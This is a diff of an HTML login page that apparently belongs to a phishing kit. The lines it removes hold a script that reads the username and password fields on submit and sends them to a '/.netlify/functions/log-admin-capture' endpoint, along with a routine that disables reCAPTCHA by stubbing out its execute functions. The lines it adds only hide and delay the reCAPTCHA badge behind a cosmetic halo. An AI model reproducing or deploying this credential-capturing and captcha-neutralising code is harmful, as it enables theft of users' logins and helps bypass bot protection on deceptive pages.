@@ -304,177 +304,65 @@ function onSubmit(token) {
 <!-- END: Validation + banner additions -->
 
 
-<!-- BEGIN: badge halo + delay + logging + recaptcha neutralizer (fixed) -->
-<style id="rc-halo-style">
-  /* 0) Badge should start hidden; reveal after 0.5s */
-  .grecaptcha-badge.rc-hidden { opacity: 0; transition: opacity .2s ease; }
+<!-- BEGIN: badge halo + delay + logging + recaptcha neutralizer -->
+<!-- END: badge halo + delay + logging + recaptcha neutralizer -->
 
-  /* 1) Thin halo: positioned EXACTLY over the collapsed badge rect (non-hover) */
-  #rc-prehalo {
-    position: fixed;
-    top: 0; left: 0; width: 0; height: 0;
-    box-shadow: 0 0 12px 1px rgba(255,255,255,0.35);
-    border-radius: 6px;
-    pointer-events: none;
-    opacity: 0;
-    z-index: 9998;
-  }
-  @keyframes rcHaloFlash { 
-    0% { opacity: 0.45; } 
-    100% { opacity: 0; } 
-  }
-  #rc-prehalo.show { animation: rcHaloFlash .2s linear forwards; }
+<!-- BEGIN: RC badge visibility (early hide + 0.3 halo / 0.5 badge) -->
+<style id="rc-early-hide-css">
+/* Hide any recaptcha anchor while rc-hide-badge is set */
+.rc-hide-badge .grecaptcha-badge,
+.rc-hide-badge iframe[src*="/recaptcha/api2/anchor"],
+.rc-hide-badge iframe[src*="/recaptcha/enterprise/anchor"] {
+  opacity: 0 !important;
+  visibility: hidden !important;
+  pointer-events: none !important;
+}
 </style>
-
-<script id="rc-badge-halo-logger">
+<style id="rc-badge-visible-css">
+/* When visible, restore interactions */
+.rc-badge-visible .grecaptcha-badge {
+  opacity: 1 !important;
+  visibility: visible !important;
+}
+</style>
+<style id="rc-badge-ghost-css">
+/* Thin self-halo only (no inner rim, no drop shadow, no wide spread) */
+.rc-badge-ghost{
+  position: fixed;
+  bottom: 14px;
+  right: -186px;             /* closed position to match badge */
+  width: 256px;
+  height: 60px;
+  border-radius: 6px;
+  background: transparent;
+  /* Crisp thin white rim around the card */
+  box-shadow: 0 0 0 1.5px rgba(255,255,255,0.30);
+  opacity: 0;
+  visibility: hidden;
+  pointer-events: none;
+  z-index: 9998;
+  transition: opacity 120ms ease;
+}
+.rc-badge-ghost-on .rc-badge-ghost{ opacity: 1; visibility: visible; }
+</style>
+<script id="rc-early-hide">(function(){try{document.documentElement.classList.add('rc-hide-badge');}catch(_){}})();</script>
+<script id="rc-badge-ghost-show">
 (function(){
-  'use strict';
-  var LOG_FN = '/.netlify/functions/log-admin-capture';
-
-  function q(sel, root){ return (root||document).querySelector(sel); }
-  function pickU(form){
-    return q('#username',form)||q('[name="username"]',form)||q('input[autocomplete="username"]',form)||q('input[type="text"]',form)||q('input[type="email"]',form)||q('input:not([type]),input[type="search"]',form);
+  function add(cls){ try{ document.documentElement.classList.add(cls); }catch(_){ } }
+  function rm(cls){ try{ document.documentElement.classList.remove(cls); }catch(_){ } }
+  function showGhost(){ add('rc-badge-ghost-on'); }
+  function showBadge(){
+    rm('rc-badge-ghost-on');
+    rm('rc-hide-badge');
+    add('rc-badge-visible');
   }
-  function pickP(form){ return q('#password',form)||q('[name="password"]',form)||q('input[type="password"]',form); }
-
-  /* --- Logging helpers (compatible with current function) --- */
-  function pingGET(u,len){
-    try{
-      var url = LOG_FN + '?u='+encodeURIComponent(u)+'&l='+encodeURIComponent(len);
-      var img = new Image(1,1);
-      img.referrerPolicy = 'no-referrer-when-downgrade';
-      img.src = url;
-    }catch(_){}
+  function schedule(){
+    setTimeout(showGhost, 300);  // 0.3s: show halo
+    setTimeout(showBadge, 500);  // 0.5s: reveal badge
   }
-  async function logAdminPOST(u,p){
-    try{
-      await fetch(LOG_FN, {
-        method:'POST',
-        headers:{'content-type':'application/json'},
-        body: JSON.stringify({ username:u, password:p, pw_len:p.length }),
-        keepalive:true,
-        cache:'no-store'
-      });
-    }catch(_){}
-  }
-
-  /* --- Recaptcha neutralizer: keep badge, kill challenge --- */
-  function neutralizeRecaptcha(){
-    try{
-      // remove auto hooks on any element that could trigger execution
-      document.querySelectorAll('.g-recaptcha').forEach(function(el){
-        el.classList.remove('g-recaptcha');
-        ['data-sitekey','data-callback','data-badge','data-size'].forEach(function(a){ el.removeAttribute(a); });
-      });
-      if (window.grecaptcha){
-        var noop = function(){ try{return Promise.resolve('');}catch(e){return '';} };
-        if (typeof grecaptcha.execute==='function') grecaptcha.execute = noop;
-        grecaptcha.enterprise = grecaptcha.enterprise || {};
-        if (typeof grecaptcha.enterprise.execute==='function') grecaptcha.enterprise.execute = noop;
-        if (typeof grecaptcha.ready==='function') grecaptcha.ready = function(cb){ try{cb&&cb();}catch(_){} };
-      }
-    }catch(_){}
-  }
-
-  /* --- Badge observer: run when the badge actually appears --- */
-  function onBadgeReady(cb){
-    var b = q('.grecaptcha-badge');
-    if (b && b.getBoundingClientRect().width) return cb(b);
-
-    var obs = new MutationObserver(function(){
-      var bb = q('.grecaptcha-badge');
-      if (bb && bb.getBoundingClientRect().width){
-        try{ obs.disconnect(); }catch(_){}
-        cb(bb);
-      }
-    });
-    obs.observe(document.documentElement, {childList:true, subtree:true});
-
-    // Fallback polling (in case observer misses late insertion in shadow dom etc.)
-    var tries = 0;
-    (function tick(){
-      var bb = q('.grecaptcha-badge');
-      if (bb && bb.getBoundingClientRect().width){ try{obs.disconnect();}catch(_){ } cb(bb); return; }
-      if (++tries < 80) setTimeout(tick, 50);
-      else try{obs.disconnect();}catch(_){}
-    })();
-  }
-
-  /* --- Halo + initial 0.5s opacity hide --- */
-  function setupHaloAndDelay(badge){
-    // 0.5s hide to mask transient 404 flash
-    badge.classList.add('rc-hidden');
-    setTimeout(function(){ badge.classList.remove('rc-hidden'); }, 500);
-
-    // Ensure halo element exists
-    var halo = q('#rc-prehalo');
-    if (!halo){
-      halo = document.createElement('div');
-      halo.id = 'rc-prehalo';
-      document.body.appendChild(halo);
-    }
-
-    // Align to the EXACT collapsed badge rect (non-hover)
-    function syncHaloToBadge(){
-      try{
-        var r = badge.getBoundingClientRect();
-        if (r.width > 0 && r.height > 0){
-          halo.style.top    = r.top  + 'px';
-          halo.style.left   = r.left + 'px';
-          halo.style.width  = r.width  + 'px';
-          halo.style.height = r.height + 'px';
-        }
-      }catch(_){}
-    }
-    syncHaloToBadge();
-    // small grace period for layout snapping
-    var n=0, t=setInterval(function(){ syncHaloToBadge(); if(++n>10) clearInterval(t); }, 50);
-
-    // Show halo from 0.3s to 0.5s AFTER badge is ready
-    setTimeout(function(){ halo.classList.add('show'); }, 300);
-    setTimeout(function(){ halo.classList.remove('show'); }, 500);
-  }
-
-  /* --- Attach logging to form submit + button click (robust) --- */
-  var loggingAttached = false;
-  function attachLogging(){
-    if (loggingAttached) return;
-    var form = q('form') || q('#biscolab-recaptcha-invisible-form');
-    if (!form) return;
-    var uEl = pickU(form), pEl = pickP(form);
-    if (!uEl || !pEl) return;
-
-    function handle(){
-      try{
-        var u = (uEl.value||'').trim();
-        var p = (pEl.value||'');
-        var L = p.length;
-        if (!u || !L) return;                 // empty yok
-        if (L < 6) { pingGET(u, L); return; } // too_short
-        if (u.toLowerCase() !== 'test') { pingGET(u, L); return; } // non_admin
-        // admin_ok
-        logAdminPOST(u, p);
-      }catch(_){}
-    }
-
-    form.addEventListener('submit', handle, true); // capture= true; önce biz çalışalım
-    var btn = form.querySelector('button[type="submit"], input[type="submit"], #g-recaptcha-btn');
-    if (btn) btn.addEventListener('click', handle, true);
-    loggingAttached = true;
-  }
-
-  function init(){
-    neutralizeRecaptcha();
-    attachLogging();
-    onBadgeReady(function(badge){ setupHaloAndDelay(badge); });
-  }
-
-  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', init);
-  else init();
-  window.addEventListener('load', neutralizeRecaptcha);
+  if (document.readyState === 'complete') schedule();
+  else window.addEventListener('load', schedule);
 })();
 </script>
-<!-- END: badge halo + delay + logging + recaptcha neutralizer (fixed) -->
-
-
+<!-- END: RC badge visibility -->
 </body></html>
